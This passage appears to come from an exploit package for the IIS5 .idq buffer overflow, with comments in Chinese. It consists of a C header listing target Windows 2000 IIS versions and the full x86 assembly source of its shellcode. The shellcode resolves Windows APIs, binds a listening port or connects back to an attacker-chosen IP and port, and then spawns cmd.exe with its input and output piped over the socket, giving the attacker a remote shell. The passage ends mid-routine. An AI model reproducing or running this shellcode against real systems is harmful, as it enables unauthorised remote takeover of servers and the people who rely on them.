  IIS5_WIN2K_ENGLISH_SP0,

  IIS5_WIN2K_ENGLISH_SP1,

  IIS5_WIN2K_ENGLISH_SP2,


  IIS5_WIN2K_JAPANESE_SP0,

  IIS5_WIN2K_JAPANESE_SP1,

  IIS5_WIN2K_JAPANESE_SP2,


  IIS_WIN2K_MEXICO_SP0,

  IIS_WIN2K_MEXICO_SP1,

  IIS_WIN2K_MEXICO_SP2,


  MAX_SYSTEM_TYPE_NUM,

};


enum Sk_ConnectType{ CONNECTTYPE_NONE=0, LISTEN_ON_PORT=1, CONNECT_TO_HOST, MAX_CONNECT_TYPE};


typedef struct _ConnectStruct{

  BYTE byConnectType;

  WORD wListenPort;

  DWORD dwConnectIP;

  WORD wConnectPort;

}ConnectStruct;


//取得一个系统的名字.

LPCTSTR GetSystemName( SYSTEM_TYPE type);


#endif //_SNAKE_SHELLCODE_FUNC_HEADER_2001_7_11


文件4.iis_idq.asm --shellcode的汇编代码(编译不需要) 

;//IIS5_idq.asm

         .386p

         .model flat,c


;//下面定义 连接 信息 结构.

stConnectInfo struct

  byConnectType db 0 ;//=1, 监听; =2,连结外部ip/port.

  byReserv1     db 1 ;//nothing just for Word Adjusted.

  dwReserv1     dw 1 ;//nothing just for Word Adjusted.

  dwListenPort  dd 0 ;//DDWORD dwIP1+dwIP2;

  dwIP1         dd 0  ;// //IP 和端口，一位用2位表示. 高位为类型,低位为值.

  dwIP2         dd 0  ;// 1.高位 =1, 低位为普通value.

  dwConnectPort dd 0  ;// 2.高位 = 2， 低位 应该 = value -1

stConnectInfo ends


;//用到的函数 结构

SkOverflowFuncAddr struct

  TerminateProcess dd 0;

  CreatePipe dd 0;

  GetStartupInfoA dd 0;

  CreateProcessA dd 0;

  PeekNamedPipe dd 0;

  GlobalAlloc dd 0;

  WriteFile dd 0;

  ReadFile dd 0;

  Sleep dd 0;

  ExitProcess dd 0;

  GetLastError dd 0;

  DuplicateHandle dd 0;

  GetCurrentProcess dd 0;

  CloseHandle dd 0;

  socket dd 0;

  bind dd 0;

  listen dd 0;

  accept dd 0;

  send dd 0;

  recv dd 0;

  setsockopt dd 0;

  WSAStartup dd 0;

  closesocket dd 0;

  connect dd 0;

  gethostname dd 0;

SkOverflowFuncAddr ends


STARTUPINFO struct

    cb   dd 0; 

    lpReserved  dd 0; 

    lpDesktop  dd 0; 

    lpTitle  dd 0; 

    dwX   dd 0; 

    dwY   dd 0; 

    dwXSize   dd 0; 

    dwYSize   dd 0; 

    dwXCountChars   dd 0; 

    dwYCountChars   dd 0; 

    dwFillAttribute   dd 0; 

    dwFlags   dd 0; 

    wShowWindow    dw 0; 

    cbReserved2    dw 0; 

    lpReserved2  dd 0; 

    hStdInput  dd 0; 

    hStdOutput  dd 0; 

    hStdError  dd 0; 

STARTUPINFO ends


PROCESS_INFORMATION struct

    hProcess dd 0; 

    hThread dd 0; 

    dwProcessId dd 0; 

    dwThreadId dd 0; 

PROCESS_INFORMATION ends; 

 

;//管套 - 命令交互 结构

Shell_Cmd_Pipe struct

  hReadPipe dd 0;

  ShellStdoutPipe dd 0;

  hWritePipe dd 0;

  ShellStdinPipe dd 0;

  msocket dd 0;

  ProcessInformation PROCESS_INFORMATION <>;

  nstartupinfo STARTUPINFO <>;

Shell_Cmd_Pipe ends


SIZE_OF_TEMP_BUFFER equ 0f0h

;//接受，写管套数据结构.

Recv_Write_Socket_Pipe_Data struct

  szTemp db SIZE_OF_TEMP_BUFFER dup(0)

  dwBreak DD 0

  dwTemp DD 0

Recv_Write_Socket_Pipe_Data ends;


SOCKADDR_IN struct

    sin_family dw 0;

    sin_port  dw 0;

    sin_addr dd 0;

    sin_zero db 8 dup(0);

SOCKADDR_IN ends


SECURITY_ATTRIBUTES struct 

    nLength DD 0; 

    lpSecurityDescriptor DD 0; 

    bInheritHandle   DD 0; 

SECURITY_ATTRIBUTES ends; 

 

FUNC_PARAM_1 equ [ebp+8]

FUNC_PARAM_2 equ [ebp+0ch]

FUNC_PARAM_3 equ [ebp+10h]

FUNC_PARAM_4 equ [ebp+14h]

FUNC_PARAM_5 equ [ebp+18h]

FUNC_PARAM_6 equ [ebp+1ch]

FUNC_PARAM_7 equ [ebp+20h]


SO_RCVTIMEO     equ 1006h ;//         receive timeout 

SOL_SOCKET      equ 0ffffh ;//          options for socket level 


Shell_Cmd_Pipe_OFFSET equ 3f0h

SkOverflowFuncAddr_OFFSET equ 2d0h

szShellNeedFunc_OFFSET equ 1d0h


  .code

  public _sk_Bind_ConnectShellCode

  public _GetDataSetOffset_Value

start:

_sk_Bind_ConnectShellCode proc

    push ebp;

    mov ebp, esp;

    ;//产生 0x800的堆栈 空间.

    xor eax,eax;

    inc eax;

    shl eax, 0bh; //=>0x800

    sub esp, eax;


    jmp call_back;

    nop;

jump_next:

    jmp run_actual1;

call_back:

    call jump_next;

call_back_Data_Offset:

    ;//jmp quit_return; //not run here as no necessary.

    ;//(void *ptr, int iLen, DWORD dwOld, DWORD dwNew)

_Convert_Add_Sign_To_Null_Sign:

    push ebp;

    mov ebp, esp;

    

    push edi;

    push ecx;

    push eax;

    push edx;


    mov edi, FUNC_PARAM_1; //第1个参数.

    mov ecx, FUNC_PARAM_2; //第2个参数.

    mov eax, FUNC_PARAM_3; //第3个参数.

    mov edx, FUNC_PARAM_4; //第4个参数.


    ;//重复查找，替换，直到cx = 0

NextAddSign:

    repnz scasb;

    jcxz Finish_Replace_Add_Sign;


    dec edi;

    mov byte ptr [edi], dl;

    inc ecx;

    jmp NextAddSign;

Finish_Replace_Add_Sign:

    pop edx;

    pop eax;

    pop ecx;

    pop edi;


    pop ebp;

    ret;

  ;//转换eax的long -> ax 标准word.

  ;//rule: 1.高位 =1, 低位为普通value.

  ;//      2.高位 = 2， 低位 应该 = value -1

_convert_Sk_Long_To_Ansi_Word:

    push ebx;

    push ecx;

    push edx;


    xor edx, edx;


    push eax; //低位 ->ebx

    pop ebx;

    shr ebx, 10h;


    push eax; //高位 -> ecx

    pop ecx;

_Convert_bx_To_al_Short:

    ;//处理ebx.

    cmp bh, 1;

    je _convert_Sk_Long_IsNormal;

    dec bl;


_convert_Sk_Long_IsNormal:

    mov al, bl;


    test edx, edx;

    jnz Finish_Convert_Next_Bit;


    shl eax, 8;

    push ecx;

    pop ebx;

    

    inc edx;

    jmp _Convert_bx_To_al_Short


Finish_Convert_Next_Bit:

    pop edx;

    pop ecx;

    pop ebx;

    ret;

run_actual1:

    jmp run_actual2;

  ;//从 szShellNeedFunc 取得 SkOverflowFuncAddr的地址

  ;//void _Get_Overflow_Addr_From_Shell_Func( void *SkOverflowFuncAddr, 

  ;//                                         char *ShellNeedFuncStr,

  ;//                                         DWORD dwGetModuleHandleAddr,

  ;//                                         DWORD dwGetProcAddr)

    ;

_Get_Overflow_Addr_From_Shell_Func:

    push ebp;

    mov ebp, esp;


    push esi;

    push edi;

    push edx;

    push ecx;

    push ebx;

    push eax;


    mov edi, FUNC_PARAM_1;  //第1个参数

    mov esi, FUNC_PARAM_2; //第2个参数


    xor ebx,ebx;

    xor ecx,ecx;

    mov cl,SHELL_NEED_FUNC_BODY_OFFSET;

    add esi, ecx; //esi = szShellCodeNeedFunc+SHELL_NEED_FUNC_BODY_OFFSET


    mov cl, byte ptr [esi];

    inc esi;

_NextDllNameToLoad:

    push ecx;


    mov bl, byte ptr [esi];

    inc esi; //skip size.


    push esi;


    mov eax, FUNC_PARAM_3; //第3个参数.

    ;//mov eax, GetModuleHandleA_Addr; //GetModuleHandleA


    call eax;


    add esi, ebx; //go to next address.

    ;//现在,esi指向 函数 数目.

    xor ecx, ecx;

    mov cl, byte ptr [esi];

    inc esi;


    ;//现在,load每个function.

_NextFunction_Addr:

    push ecx;


    ;//取字符串的大小

    mov bl, byte ptr [esi];

    inc esi;


    push eax;

    push esi;


    push esi; //procName

    push eax; //module


    mov ecx, FUNC_PARAM_4; //第3个参数.

    ;//mov eax, GetModuleHandleA_Addr; //GetModuleHandleA

    call ecx;


    mov dword ptr [edi], eax;

    add edi, 4;


    pop esi;

    pop eax;


    add esi, ebx; //指针移动到下一个字符串.


    pop ecx;

    loop _NextFunction_Addr;


    pop ecx;

    loop _NextDllNameToLoad;


    pop eax;

    pop ebx;

    pop ecx;

    pop edx;

    pop edi;

    pop esi;


    pop ebp;

    ret;

run_actual2:

    jmp run_actual3_1;

  ;//创建 一个管套，监听一个端口，返回该管套.

  ;//SOCKET _Create_Bind_Connect_Socket_To_Port( SkOverflowFuncAddr *pFuncAddr, szShellNeedFunc *pNeedFunc);

_Create_Bind_Connect_Socket_To_Port:

    push ebp;

    mov ebp, esp;


    xor eax, eax; //开辟0xff(256)个byte的变量区域.

    mov ax, 3f0h

    sub esp, eax;


    push esi;

    push edi;

    push edx;

    push ecx;

    push ebx;


    mov esi, FUNC_PARAM_1; //第一个参数.


    ;//WSAStartup(werd,&wsd);

    lea edi, [ebp-340h]; //开辟个空间做临时变量.

    xor eax, eax;

    mov al,2;

    push edi;

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.WSAStartup];

    call eax;


    ;//msocket = socket( AF_INET, SOCK_STREAM, 0); = (2,1,0)

    xor eax, eax;

    push eax;

    inc eax;

    push eax;

    inc eax;

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.socket];

    call eax;


    ;//取连结类型

    mov edx, FUNC_PARAM_2;

    lea ebx, [edx+stConnectInfo.byConnectType];

    mov cl, BYTE PTR [ebx];


    push eax;

    ;//准备参数 SOCKADDR_IN

    lea edi, [ebp-0f0h]; //现在是sockaddr_in的地址.

    lea ebx, [edi + SOCKADDR_IN.sin_family];

    xor eax, eax;

    mov al,2;

    mov word ptr [ebx], ax; //SOCKADDR_IN.sin_family = AF_INET

    pop eax;


    ;//现在寄存器状况..

    ;//edi --- 临时变量 sockaddr_in, (sin_family = AF_INET 被赋值)

    ;//edx --- 参数2 stConnectInfo 连结信息

    ;//eax --- 创建的管套 newsocket.

    ;//esi --- 参数1 SkOverflowFuncAddr 函数地址.


    cmp cl,1 ;//是监听吗?

    jne _IsConnectToIP; //no. 跳转.


    push eax; // <-2@


    ;//取得端口value.

    push eax; // <-1@


    mov eax, [edx+stConnectInfo.dwListenPort];

    call _convert_Sk_Long_To_Ansi_Word;

    mov ecx, eax;

    xchg ch,cl; //port = htons(port)


    pop eax; // ->1@


    lea ebx, [edi + SOCKADDR_IN.sin_port];

    mov edx, FUNC_PARAM_2; //第2个参数.

    mov word ptr [ebx], cx; //SOCKADDR_IN.sin_port = port.


    xor eax, eax;

    lea ebx, [edi + SOCKADDR_IN.sin_addr];

    mov dword ptr [ebx], eax; //SOCKADDR_IN.sin_addr.S_un.S_addr = INADDR_ANY


    pop eax; // ->2@

    push eax; //<-3@


    ;//bind( msocket, (SOCKADDR *)&addrin, sizeof(addrin));

    xor ecx, ecx;

    mov cl, size sockaddr_in;

    push ecx;

    push edi;

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.bind];

    call eax;

  ;//下面的跳转，用来消去 距离太远造成的0. 对源程序没有影响的代码.

    jmp _temp_1;


run_actual3_1:

    jmp run_actual3_2;


_temp_1:


    pop eax; //->3@

    push eax; //<-4@


    ;//listen( msocket, 1);

    xor ecx, ecx;

    inc ecx;

    

    push ecx;

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.listen];

    call eax;


    pop eax; //->4@

    push eax; //<-5@


    ;//newsocket = accept( msocket, (SOCKADDR*)&addrin, &iLen);

    xor ecx, ecx;

    mov cl, size sockaddr_in;

    lea edi, [ebp-0c0h];

    mov [edi], ecx;

    push edi; //iLen = sizeof(addrin);

    lea edi, [ebp-0f0h];

    push edi; //&SOCKADDR_IN 结构.

    push eax;


    mov eax,[esi+SkOverflowFuncAddr.accept];

    call eax;


    pop edx; //->5@ //用来listen的socket.由eax->edx


    push eax; //<-6@  //得到新的连结管套..


    ;//关闭 用来 listen的socket.

    ;//closesocket( msocket);

    push edx;

    mov eax, [esi+SkOverflowFuncAddr.closesocket];

    call eax;


    pop eax; //->6@


    cmp eax, -1;

    je WSocket_QuitRightNow;


    jmp Finish_Get_Connection_Socket;


_IsConnectToIP: ;//连接到一个ip:port

    ;//addrin.sin_family = AF_INET;

    ;//addrin.sin_addr.S_un.S_addr = 0x0100007f;

    ;//addrin.sin_port = 0x8b; //139.


    ;//connect( socket, (SOCKADDR*)&addrin, sizeof(addrin));

    ;//准备参数 SOCKADDR_IN

    ;//现在寄存器状况..

    ;//edi --- 临时变量 sockaddr_in, (sin_family = AF_INET 被赋值)

    ;//edx --- 参数2 stConnectInfo 连结信息

    ;//eax --- 创建的管套 newsocket.

    ;//esi --- 参数1 SkOverflowFuncAddr 函数地址.


    ;//取得端口value.

    push eax; //<-1@


    mov eax, [edx+stConnectInfo.dwConnectPort];

    call _convert_Sk_Long_To_Ansi_Word;

    mov ecx, eax;

    xchg ch,cl; //port = htons(port)


    lea ebx, [edi + SOCKADDR_IN.sin_port];

    mov word ptr [ebx], cx; //SOCKADDR_IN.sin_port = port.


  ;//下面的跳转，用来消去 距离太远造成的0. 对源程序没有影响的代码.

    jmp _temp_1_1;


run_actual3_2:

    jmp run_actual3;


_temp_1_1:


    mov eax, [edx+stConnectInfo.dwIP1];

    call _convert_Sk_Long_To_Ansi_Word;

    mov ecx, eax;

    shl ecx, 10h;

    mov eax, [edx+stConnectInfo.dwIP2];

    call _convert_Sk_Long_To_Ansi_Word;

    mov cx, ax;

    lea ebx, [edi + SOCKADDR_IN.sin_addr];

    mov dword ptr [ebx], ecx; //SOCKADDR_IN.sin_addr.S_un.S_addr = stConnectInfo.dwIP1 + dwIP2


    pop eax; //->1@

    push eax; //<-2@


    ;//connect(msocket, addr, 0x10);

    xor ecx, ecx;

    mov cl, 10h;

    push ecx;  //sizeof(SOCKADDR_IN);

    push edi;  //SOCKADDR *

    push eax;  //msocket.

    mov eax, [esi+SkOverflowFuncAddr.connect];

    call eax; //connect.


    mov ecx, eax;

    pop eax;     //->2@

    jcxz Finish_Get_Connection_Socket; //connect success.

    nop;


    ;//now, connect failure.

    ;//closesocket(eax)

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.closesocket];

    call eax;


    xor eax, eax;

    jmp WSocket_QuitRightNow;


Finish_Get_Connection_Socket:

    push eax;


    push eax;

    pop edx; //edx = eax


    ;//  setsockopt( newsocket, SOL_SOCKET, SO_RCVTIMEO, (LPCTSTR)&iLen, sizeof(iLen));

    lea edi, [ebp-0f0h];

    xor eax, eax;

    mov al, 1;

    mov [edi], eax;

    shl eax, 2; //eax = 4


    push eax;

    push edi;

    mov ax, SO_RCVTIMEO;

    push eax;

    mov ax, SOL_SOCKET;

    push eax;

    push edx;


    mov eax, [esi+SkOverflowFuncAddr.setsockopt];

    call eax;


    pop eax;

WSocket_QuitRightNow:

    ;//返回结果.

    pop ebx;

    pop ecx;

    pop edx;

    pop edi;

    pop esi;


    mov esp, ebp;


    pop ebp;

    ret;

run_actual3:

    jmp run_actual4_1;

  ;//在管套 pipe 上，运行进程 pStrCmd;

  ;//_Create_Process_To_Handle( SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe, LPCTSTR *pStrCmd);

_Create_Process_To_Handle:

    push ebp;

    mov ebp, esp;


    push edi;

    push esi;

    push edx;

    push ecx;

    push ebx;

    push eax;


    mov edi, FUNC_PARAM_2; //Shell_Cmd_Pipe *pCmdPipeData;


    push edi;

    pop edx; //edx = edi;

    ;//memset( &si, 0, sizeof(STARTUPINFO));

    xor eax, eax;

    lea edi, [edi +Shell_Cmd_Pipe.nstartupinfo];

    push edi; //edi = &STARTUPINFO; ---

    xor ecx, ecx;

    mov cl, size STARTUPINFO;

    rep stosb;


    pop edi;  //                    ---


    ;//si.cb = sizeof(STARTUPINFO);

    lea esi, [edi + STARTUPINFO.cb];

    mov cl, size STARTUPINFO;

    mov [esi], ecx;

    ;//si.wShowWindow = SW_HIDE = 0; //need to do nothing.

    ;//si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;

    lea esi, [edi + STARTUPINFO.dwFlags];

    mov cx, 101h;

    mov [esi], ecx;

    ;//si.hStdInput = ShellStdinPipe;

    push edi;

    lea edi, [edi + STARTUPINFO.hStdInput];

    lea esi, [edx + Shell_Cmd_Pipe.ShellStdinPipe];

    mov eax, [esi];

    mov [edi], eax;

    pop edi;

    ;//si.hStdOutput = ShellStdoutPipe;

    push edi;

    lea edi, [edi+STARTUPINFO.hStdOutput];

    lea esi, [edx+Shell_Cmd_Pipe.ShellStdoutPipe];

    mov eax, [esi];

    mov [edi], eax;

    pop edi;


    ;// DuplicateHandle( GetCurrentProcess(), ShellStdoutPipe, GetCurrentProcess(),

    ;//                  &(si.hStdError),DUPLICATE_SAME_ACCESS, TRUE, 0);

    mov esi, FUNC_PARAM_1;

    mov eax, [esi+SkOverflowFuncAddr.GetCurrentProcess];

    call eax;


    xor ecx, ecx;

    push ecx;         //0

    inc ecx;

    push ecx;         //TRUE

    inc ecx;

    push ecx;         //DUPLICATE_SAME_ACCESS

    lea edx, [edi+STARTUPINFO.hStdError];

    push edx;         //&(si.hStdError)

    push eax;         //GetCurrentProcess();

    

    push esi;

    mov esi, FUNC_PARAM_2;

    lea esi, [esi+Shell_Cmd_Pipe.ShellStdoutPipe];

    mov ebx, [esi];

    pop esi;


    ;//下面的跳转，用来消去 距离太远造成的0. 对源程序没有影响的代码.

    jmp _temp_2;


run_actual4_1:

    jmp run_actual4;


_temp_2:


    push ebx;         //ShellStdoutPipe

    push eax;         //GetCurrentProcess();


    mov eax, [esi+SkOverflowFuncAddr.DuplicateHandle];

    call eax;


    ;// CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0,

    ;//                NULL, NULL, &si, &ProcessInformation )

    xor eax, eax;

    mov edi, FUNC_PARAM_2;

    lea edx, [edi+Shell_Cmd_Pipe.ProcessInformation];

    push edx;            ;//&ProcessInformation

    lea edx, [edi+Shell_Cmd_Pipe.nstartupinfo];

    push edx;            ;//&si

    push eax;            ;//NULL;

    push eax;            ;//NULL;

    push eax;            ;//0;

    inc eax;

    push eax;            ;//TRUE;

    dec eax;

    push eax;            ;//NULL;

    push eax;            ;//NULL;

    mov edx, FUNC_PARAM_3;

    push edx;            ;//LPCTSTR lpszCommand.

    push eax;            ;//NULL;


    mov eax, [esi+SkOverflowFuncAddr.CreateProcessA];

    call eax;


    ;//CloseHandle( ShellStdinPipe);

    mov eax, [edi+Shell_Cmd_Pipe.ShellStdinPipe];

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.CloseHandle];

    call eax;

    ;//CloseHandle( ShellStdoutPipe);

    mov eax, [edi+Shell_Cmd_Pipe.ShellStdoutPipe];

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.CloseHandle];

    call eax;


    pop eax;

    pop ebx;

    pop ecx;

    pop edx;

    pop esi;

    pop edi;


    mov esp, ebp;

    pop ebp;

    ret;

    ;//memset( &si, 0, sizeof(STARTUPINFO));

run_actual4:

    jmp run_actual5;

  ;//关闭不再用的管套

  ;//_Close_All_Communication_Pipe(SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

_Close_All_Communication_Pipe:

    push ebp;

    mov ebp, esp;


    push esi;

    push edi;

    push edx;

    push ecx;

    push ebx;

    push eax;


    mov esi, FUNC_PARAM_1;

    mov edi, FUNC_PARAM_2;


    ;//closesocket(msocket);

    mov eax, [edi+Shell_Cmd_Pipe.msocket];

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.closesocket];

    call eax;


    ;//closehandle(handle)..

    mov eax, [edi+Shell_Cmd_Pipe.hReadPipe];

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.CloseHandle];

    call eax;


    ;//closehandle(handle)..

    mov eax, [edi+Shell_Cmd_Pipe.hWritePipe];

    push eax;

    mov eax, [esi+SkOverflowFuncAddr.CloseHandle];

    call eax;


    pop eax;

    pop ebx;

    pop ecx;

    pop edx;

    pop edi;

    pop esi;


    mov esp, ebp;

    pop ebp;

    ret;

run_actual5:

    jmp run_actual6_1;

  ;//接受管套的数据，写进pipe,读pipe,发送到socket.

  ;//_Recv_Write_Socket_Pipe(  SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

_Recv_Write_Socket_Pipe:

    push ebp;

    mov ebp, esp;


    xor eax, eax;

    mov ax, 2f0h;

    sub esp, eax; // 496bytes, use for char szTemp[240];


    push esi;

    push edi;

    push edx;

    push ecx;

    push ebx;


    mov esi, FUNC_PARAM_1; //SkOverflowFuncAddr *pAddr;

    mov edi, FUNC_PARAM_2; //Shell_Cmd_Pipe *pCmdPipeData;

    

    ;//dwBreak = 1

    lea edx, [ebp - size Recv_Write_Socket_Pipe_Data + Recv_Write_Socket_Pipe_Data.dwBreak];

    xor eax, eax;

    inc eax;

    mov [edx], eax;

    ;//while(!bBreak)

_While_Read_Data_Loop:

    ;//监测 dwBreak == 0?

    lea edx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwBreak];

    mov eax, [edx];

    test eax, eax;

    jz _Quit_While_Read_Data_Loop_1;


    ;//iLen = recv( newsocket, szTemp, sizeof(szTemp)-1, 0);

    xor eax, eax;

    push eax;

    mov al, SIZE_OF_TEMP_BUFFER;

    push eax;

    lea eax, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.szTemp];

    push eax;


    lea ebx, [edi+Shell_Cmd_Pipe.msocket];

    mov eax, [ebx];

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.recv];

    call eax;


    cmp eax, -1;

    jne _NextStep_Receive_Test;


    push eax;

    pop edx;


    mov eax, [esi+SkOverflowFuncAddr.GetLastError];

    call eax;


    cmp ax, 10060; //timeout?

    je _Read_StdoutPipe;


_Quit_While_Read_Data_Loop_1:

    jmp _Quit_While_Read_Data_Loop; //error.

_NextStep_Receive_Test:

    test eax, eax; //eax == 0?

    je _Quit_While_Read_Data_Loop; //break;


    jng _Read_StdoutPipe;


;//Receive_Ok_Occure:

    ;//if( iLen > 0)

    ;//WriteFile( hWritePipe, szTemp, iLen, &dwTemp, NULL)

    xor edx, edx;

    push edx; //NULL

    lea ebx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwTemp];

    push ebx; //&dwTemp

    push eax; //iLen

    lea ebx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.szTemp];

    push ebx; //szTemp;

    mov eax, [edi+Shell_Cmd_Pipe.hWritePipe];

    push eax;


    mov eax, [esi+SkOverflowFuncAddr.WriteFile];

    call eax;


    test eax, eax;

    jz _Quit_While_Read_Data_Loop; //WriteFile(..) == 0, 失败，管套中断.

    

  ;//下面的跳转，用来消去 距离太远造成的0. 对源程序没有影响的代码.

    jmp _temp_3;


run_actual6_1:

    jmp run_actual6;


_temp_3:


_Read_StdoutPipe:

    ;//PeekNamedPipe(hReadPipe,NULL,0,NULL,&dwTemp,NULL );

    xor eax, eax;

    push eax; //NULL

    lea edx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwTemp];

    push edx; //&dwTemp

    push eax; //NULL

    push eax; //0

    push eax; //NULL

    mov eax, [edi+Shell_Cmd_Pipe.hReadPipe];

    push eax; //hReadPipe


    mov eax, [esi+SkOverflowFuncAddr.PeekNamedPipe];

    call eax;


    mov eax, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwTemp];

    test eax, eax;

    jz _No_Data_To_Read_Yet;


    ;//ReadFile( hReadPipe, szTemp, sizeof(szTemp), &dwTemp, NULL)

    xor eax, eax;

    push eax;  //NULL

    lea edx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwTemp];

    push edx;  //&dwTemp

    mov al, SIZE_OF_TEMP_BUFFER;

    push eax; //sizeof(szTemp);

    lea edx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.szTemp];

    push edx; //szTemp;

    mov eax, [edi+Shell_Cmd_Pipe.hReadPipe];

    push eax; //hReadPipe


    mov eax, [esi+SkOverflowFuncAddr.ReadFile];

    call eax; //ReadFile.


    ;//if( ReadFile (...) == 0)? then quit.

    test eax, eax;

    je _Quit_While_Read_Data_Loop;


    ;//send( newsocket, szTemp, dwTemp, 0);

    xor eax, eax;

    push eax; //0

    mov eax, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.dwTemp];

    push eax; //dwTemp;

    lea edx, [ebp- size Recv_Write_Socket_Pipe_Data +Recv_Write_Socket_Pipe_Data.szTemp];

    push edx; //szTemp;

    mov eax, [edi+Shell_Cmd_Pipe.msocket];

    push eax; //socket.


    mov eax, [esi+SkOverflowFuncAddr.send];

    call eax;


    cmp eax, -1;

    je _Quit_While_Read_Data_Loop;


    jmp _Read_StdoutPipe; //continue to read next data.

_No_Data_To_Read_Yet:

    jmp _While_Read_Data_Loop;


_Quit_While_Read_Data_Loop:


    pop ebx;

    pop ecx;

    pop edx;

    pop edi;

    pop esi;


    mov esp, ebp;

    pop ebp;

    ret;

run_actual6:

    jmp run_actual;

  ;//BOOL _Create_Two_Pipe( SkOverflowFuncAddr *pFuncAddr, Shell_Cmd_Pipe *pCmdPipe);

_Create_Two_Pipe:

    push ebp;

    mov ebp, esp;


    xor eax, eax;

    mov al, 0f0h;

    sub esp, eax; //开辟空间


    push esi;

    push edi;

    push edx;

    push ecx;

    push ebx;


    mov esi, FUNC_PARAM_1;

    mov edi, FUNC_PARAM_2;


    xor ebx,ebx;

    lea edi, [ebp-10h];


    ;//SecurityAttributes.lpSecurityDescriptor = NULL; //default ACL

    lea edx, [edi+SECURITY_ATTRIBUTES.lpSecurityDescriptor];

    mov [edx], ebx;

    ;//SecurityAttributes.bInheritHandle = TRUE;  //will inherit handle

    lea edx, [edi+SECURITY_ATTRIBUTES.bInheritHandle];

    inc ebx;

    mov [edx], ebx;

    ;//SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);

    lea edx, [edi+SECURITY_ATTRIBUTES.nLength];

    mov bl, size SECURITY_ATTRIBUTES;

    mov [edx], ebx;


    xor ebx, ebx;

    ;//bResult = CreatePipe( &hReadPipe, &ShellStdoutPipe, &SecurityAttributes, 0);output into _FUNC_PARAM_2's variables.


    push edi; //save.


    push ebx;      //0

    push edi;      //&SecurityAttributes


    mov edi, FUNC_PARAM_2;

    lea edx, [edi+Shell_Cmd_Pipe.ShellStdoutPipe];

    mov [edx], ebx; //ShellStdoutPipe = 0;

    push edx;      //&ShellStdoutPipe

    lea edx, [edi+Shell_Cmd_Pipe.hReadPipe];

    push edx;;      //&hReadPipe

    mov eax, [esi+SkOverflowFuncAddr.CreatePipe];

    call eax;


    pop edi; //restore.


    test eax, eax;

    je _Create_Pipe_Quit_Error;

    

    ;//Create Second Pipe.

    ;//CreatePipe( &ShellStdinPipe, &hWritePipe, &SecurityAttributes, 0);

    xor ebx, ebx;


    push ebx;      //0

    push edi;      //&SecurityAttributes


    mov edi, FUNC_PARAM_2;

    lea edx, [edi+Shell_Cmd_Pipe.hWritePipe];

    push edx;      //&hWritePipe

    lea edx, [edi+Shell_Cmd_Pipe.ShellStdinPipe];

    mov [edx],ebx;

    push edx;      //&ShellStdinPipe


    mov eax, [esi+SkOverflowFuncAddr.CreatePipe];

    call eax;


    test eax, eax;

    je _Create_Pipe_Quit_Error;


    xor eax, eax;

    inc eax;

    jmp _Create_Pipe_Quit;


_Create_Pipe_Quit_Error:

    xor eax, eax;

    jmp _Create_Pipe_Quit;

    nop;


_Create_Pipe_Quit:

    pop ebx;

    pop ecx;

    pop edx;

    pop edi;

    pop esi;


    mov esp, ebp;

    pop ebp;

    ret;

run_actual:

    lea esi, [esp];

    mov esi, [esi]; //ebx 是调用代码的地址

    xor ecx, ecx;

    mov cx,MyDataOffset;

    add esi, ecx; //esx 是未来 数据的地址.


    ;//ebp-0x2ff 处，是 szShellNeedFunc结构.

    lea edi, [ebp - szShellNeedFunc_OFFSET];

    push edi;


    ;//MyDebugAdd -----

    mov cx, _size_AllData;

    rep movsb;


    ;//还要包括 连接信息结构 的数据

    pop edi;

    push edi;


    ;//将'+'转换成 "\x00"

    ;//void _Convert_Add_Sign_To_Null_Sign(void *ptr, int iLen, DWORD dwOld, DWORD dwNew);

    xor ecx, ecx;

    push ecx;  //---参数4

    mov cl, '+';

    push ecx;  //---参数3

    mov cx, _size_szShellNeedFunc;

    push ecx;  //---参数2

    xor ebx, ebx;

    mov bl, String_Of_Data_Offset;

    add edi, ebx; //edi指向 真正的 szShellNeedFunc

    push edi;  //---参数1


    call _Convert_Add_Sign_To_Null_Sign; 

    add esp, 10h;


    ;//从 szShellNeedFunc 取得 SkOverflowFuncAddr的地址

    ;//void _Get_Overflow_Addr_From_Shell_Func( SkOverflowFuncAddr *pSkOverflowFuncAddr, char *ShellNeedFuncStr, DWORD dwGetModuleHandleAddr, DWORD GetProcAddr)

    xor ecx, ecx;

    mov cx, _GetModuleHandle_Addr_Offset;

    mov esi, edi;

    add esi, ecx;

    mov eax, [esi+4]

    push eax;         ;//GetProcAddress_Addr

    mov eax, [esi];

    push eax;         ;//GetModuleHandle_Addr


    push edi;

    ;//ebp-0x1ff处,是 SkOverflowFuncAddr结构.

    lea esi, [ebp-SkOverflowFuncAddr_OFFSET];

    push esi;

    call _Get_Overflow_Addr_From_Shell_Func;

    add esp, 10h;


    pop edi;

    ;//创建 一个管套，监听一个端口/连接到一个ip:port，返回该管套.

